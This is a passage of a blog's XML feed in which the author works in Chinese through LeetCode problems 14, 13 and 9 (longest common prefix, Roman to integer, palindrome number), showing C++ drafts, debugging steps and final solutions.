class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么if如果&#x3D;&#x3D;我们可以让他break掉，但是&#x3D;&#x3D; 反而break，好像给别人看起来就会很怪异，那么就干脆修改成!&#x3D;,这样应该就比较合理了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;      <span class="comment">//用str[0]作为对象与后面的比较</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i])</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    s += strs[<span class="number">0</span>][i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再测试一下：</p><img src="/2022/04/11/leetcodeno14/002.png" class=""><p>额，好像strs[1]比strs[0]要短哦，if好像还应该判断i有没有到达<code>strs[j].lenght()</code>，如果已经到达了后者，那么前面也没必要在判断了，或者说后者比前者大时，i如果没到达<code>strs[j].lenght()</code>，也不用着急停止。意味着我们的if应该是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i] &amp;&amp; i != strs[j].<span class="built_in">length</span>())</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>在测试了一下发现结果还是一样的</p><img src="/2022/04/11/leetcodeno14/002.png" class=""><p>拿去debug了一下。想起来break只是结束了内循环，s+还是生效了，所以如果符合if的条件时，我们应该让整个for都结束。能够达到这一类效果的应该就是直接return s;了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        string s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;      </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i] &amp;&amp; i != strs[j].<span class="built_in">length</span>())</span><br><span class="line">                    <span class="keyword">return</span> s;</span><br><span class="line">            &#125;</span><br><span class="line">            s += strs[<span class="number">0</span>][i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>测试了两个示例结果都正常的，提交看看。</p><img src="/2022/04/11/leetcodeno14/003.png" class=""><p>额小尴尬，解答错误了。</p><p>……又想了一圈，if里面应该是用或的，要么达到<code>strs[j].length()</code>,要么就是两个不相等，所噶所噶。。今天脑子有点不好使。<br>把解答错误的案例塞进去试了一下：</p><img src="/2022/04/11/leetcodeno14/004.png" class=""><p>。。。。。。坏事</p><p>哦哦哦。。应该是要么俩不相等，要么<code>i==strs[j].lenght()</code>;表示它走到头了该断了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i] || i == strs[j].<span class="built_in">length</span>())</span><br></pre></td></tr></table></figure><img src="/2022/04/11/leetcodeno14/005.png" class=""><p>再次提交：</p><img src="/2022/04/11/leetcodeno14/006.png" class=""><p>总算是过了。</p><p>最后修正：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestCommonPrefix</span><span class="params">(vector&lt;string&gt;&amp; strs)</span> </span>&#123;</span><br><span class="line">        string s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; strs[<span class="number">0</span>].<span class="built_in">length</span>(); i++)&#123;     </span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; strs.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(strs[<span class="number">0</span>][i] != strs[j][i] || i == strs[j].<span class="built_in">length</span>())</span><br><span class="line">                    <span class="keyword">return</span> s;</span><br><span class="line">            &#125;</span><br><span class="line">            s += strs[<span class="number">0</span>][i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>…简单的题目就挺折腾的了，而且c++有段时间不看，就忘了一些函数的用法了。。得回头补补了</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第十三题</title>
      <link href="/2022/04/10/leetcodeno13/"/>
      <url>/2022/04/10/leetcodeno13/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>额想了个把小时都没有很好的主意去处理六个特殊情况。</p><span id="more"></span><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>switch</li><li>string</li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><img src="/2022/04/10/leetcodeno13/000.png" class=""><p>提示：</p><ul><li>1 &lt;&#x3D; s.length &lt;&#x3D; 15</li><li>s 仅含字符 (‘I’, ‘V’, ‘X’, ‘L’, ‘C’, ‘D’, ‘M’)</li><li>题目数据保证 s 是一个有效的罗马数字，且表示整数在范围 [1, 3999] 内</li><li>题目所给测试用例皆符合罗马数字书写规则，不会出现跨位等情况。</li><li>IL 和 IM 这样的例子并不符合题目要求，49 应该写作 XLIX，999 应该写作 CMXCIX 。</li></ul><blockquote><p>好处是罗马数字就七种字符，坏处有特殊的组合<br>且字符串s长度不超过15，转换后的整数范围不超过3999，这样倒是不用担心越界了。</p></blockquote><p>初始代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后返回转换的罗马数字即可。</p><hr><h2 id="初解"><a href="#初解" class="headerlink" title="初解"></a>初解</h2><p>因为就7个字符，感觉可以用switch直接套，不然用map再套一层好像增加空间了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getCsetV</span><span class="params">(<span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span> : <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span> : <span class="keyword">return</span> <span class="number">5</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span> : <span class="keyword">return</span> <span class="number">10</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span> : <span class="keyword">return</span> <span class="number">50</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span> : <span class="keyword">return</span> <span class="number">100</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span> : <span class="keyword">return</span> <span class="number">500</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span> : <span class="keyword">return</span> <span class="number">1000</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>就先封装一个函数，但是问题就在于那几个特殊组合的情况。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i] &lt; s[i+<span class="number">1</span>])&#123;</span><br><span class="line">                n += <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]) - <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                n += <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getCsetV</span><span class="params">(<span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span> : <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span> : <span class="keyword">return</span> <span class="number">5</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span> : <span class="keyword">return</span> <span class="number">10</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span> : <span class="keyword">return</span> <span class="number">50</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span> : <span class="keyword">return</span> <span class="number">100</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span> : <span class="keyword">return</span> <span class="number">500</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span> : <span class="keyword">return</span> <span class="number">1000</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>遍历一遍是肯定要的，但是如果判断的是字符相不相等，再使其控制<code>n += </code>的情况，又有点不对头，因为i到了字符串末尾的时候，i+1就越界了不说。。单纯的s[i]返回的是字符，也不能作为比较的条件，那么就要创建两个变量或者是if的时候就要把s[i]放到getCsetV里面。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">getCsetV</span>(s[i]) &lt; <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]))&#123;</span><br><span class="line">        n += <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]) - <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        n += <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样修改后，测试的时候就会发现问题了，比如”IV”：</p><img src="/2022/04/10/leetcodeno13/001.png" class=""><p>貌似多了个5。。其实原因就是i&lt;的是s.length();<br>两个字符的时候，0 和 0+1已经判断过了，就没必要让i在自增了，<del>解决办法就是<code>i &lt; s.length()-1</code>;</del></p><p>-1方法不可取，之前脑子又陷进去了,为什么这么说呢，因为IV是特殊组合，它不需要像正常那样从左+到右，它是一组固定的值，如果我-1了，那个字符串正好是”LVIII“的话，最后的i就被舍弃了。</p><img src="/2022/04/10/leetcodeno13/002.png" class=""><p>debug了一圈，抓到是n+的问题。如果后者大于前者，n+&#x3D;后者-前者，但是最后还是要额外+一个后者。<br>所以应该是后者大于前者时，n -&#x3D; 前者，n此时为负数，然后就是正常情况下n +&#x3D; 后者。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">getCsetV</span>(s[i]) &lt; <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]))&#123;</span><br><span class="line">    n -= <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    n += <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后又测了几个示例，应该是差不多了，提交一下：</p><img src="/2022/04/10/leetcodeno13/003.png" class=""><p>完整代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">getCsetV</span>(s[i]) &lt; <span class="built_in">getCsetV</span>(s[i+<span class="number">1</span>]))&#123;</span><br><span class="line">                n -= <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                n += <span class="built_in">getCsetV</span>(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getCsetV</span><span class="params">(<span class="type">char</span> c)</span></span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;I&#x27;</span> : <span class="keyword">return</span> <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span> : <span class="keyword">return</span> <span class="number">5</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;X&#x27;</span> : <span class="keyword">return</span> <span class="number">10</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span> : <span class="keyword">return</span> <span class="number">50</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span> : <span class="keyword">return</span> <span class="number">100</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span> : <span class="keyword">return</span> <span class="number">500</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span> : <span class="keyword">return</span> <span class="number">1000</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>好像没有特别能优化的地方，唯一想优化的就是对那几组特殊组合，能有什么办法不用循环判断就好了，直接循环累加。<br>map在我的想法里用起来也挺麻烦的感觉。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>然后就是翻阅评论了，精选第一条其实就是解释了一个思想。</p><img src="/2022/04/10/leetcodeno13/004.png" class=""><p>不过他用的hashmap，我是想如果能不额外增加变量那最好，虽然不知道hashmap的效率会不会更高。</p><p>然后就是一个秀儿的代码：</p><img src="/2022/04/10/leetcodeno13/005.png" class=""><p>雀食有点意思啊，直接把字符串s替换一下，把那六个组合替换成别的代替的字符，然后switch的时候分别对应六个值，这样for循环雀食省了if，只管累加就行。。。确实优秀</p>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode第九题</title>
      <link href="/2022/04/08/leetcodeno9/"/>
      <url>/2022/04/08/leetcodeno9/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>先按难度往下走，因为数据结构还没理清。</p><span id="more"></span><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><del>c++ string：</del></p><ul><li><del>length —— 返回字符串长度</del></li><li><del>size —— 返回字符串长度</del></li></ul><p><del><strong>注意：strlen是以char*去计算字符串长度直到‘\0’结束，本题用不到。</strong></del></p><p>c++ vector:</p><ul><li>size —— 获取vector容器元素个数</li><li>operator[] —— 类似数组根据下标返回元素值</li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h2><img src="/2022/04/08/leetcodeno9/000.png" class=""><p>c++给到的代码框架：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>bool型函数，返回true或false即可</p></blockquote><p>根据现有条件可以排除x&lt;10的情况，因为个位数不可能存在回文现象，而两位数的10也不存在，负数更不用说，多了个-号；故此首先判断x&lt;10，如果成立直接返回false；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x &lt; <span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是要拆开x去判断是否为回文数字,题目进阶思想是不使用将整数转换成字符串。先用最低级暴力去解题试试看。</p><hr><h3 id="初解"><a href="#初解" class="headerlink" title="初解"></a>初解</h3><p>字符串这里肯定不能用char了，因为不知道长度，所以得用str接着，让x每次%10，然后让str+&#x3D;x%10;</p><p><strong>注意：这里有个问题就是，int类型无法直接+&#x3D;给string类型，网上是有一些不同版本特性诞生的函数可以操作，但是这样对于算法的鲁棒性就很差了</strong><br>所以字符串应该是不可取的，至于题目进阶反而提示的是不使用整数转换成字符串我就不是很了解了，等我做完看看评论大哥怎么做的。</p><p>在上述不考虑string的情况下，我们如何让一个int类型还能做到拆分成像数组一样呢？其实就是老朋友vector了。</p><p>我们可以通过while转换:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"><span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    v.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">    x /= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>即x倒置了一遍</p></blockquote><p>然后根据vector自带的size方法，先获取元素个数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> len = v.<span class="built_in">size</span>();</span><br></pre></td></tr></table></figure><p>然后首尾之间判断肯定是通过两个for循环了，但是需要统计一下，为什么这么说呢，因为我是把长度&#x2F;2来算，一个i从&#x3D;0 &lt; len&#x2F;2; 一个j &#x3D; len-1 &gt; len&#x2F;2; 这样首尾一判断也还行。故此代码： </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = len<span class="number">-1</span>; j &gt; len/<span class="number">2</span>; j--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(v[i] == v[j])</span><br><span class="line">            num++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后最后在判断一些num是否&#x3D;len&#x2F;2，这样就证明了有几组数字是相同的。</p><p>提一嘴的就是，leetcode是要求函数必须返回一个值，所以我们直接在if完之后的return还不行。要定义一个bool flag；</p><p>在东拼西凑之后，代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>( x &lt; <span class="number">10</span>)&#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">            <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(x &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                v.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">                x /= <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> len= v.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len/<span class="number">2</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> j = len<span class="number">-1</span>; j &gt; len/<span class="number">2</span>; j--)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(v[i] == v[j])</span><br><span class="line">                        num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num == len/<span class="number">2</span>)</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>测试了几个案例之后我们提交一下看看：</p><img src="/2022/04/08/leetcodeno9/001.png" class=""><p>我直呼好家伙！！！！！<br>0居然算回文啊，那个位数其实都算了吧？<br>我直呼好家伙！！！！！<br>这么重要的东西不在示例里面。。靠，不过没事，</p><p>我们修改一下<code>if(x &lt; 0)</code>就可以了：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 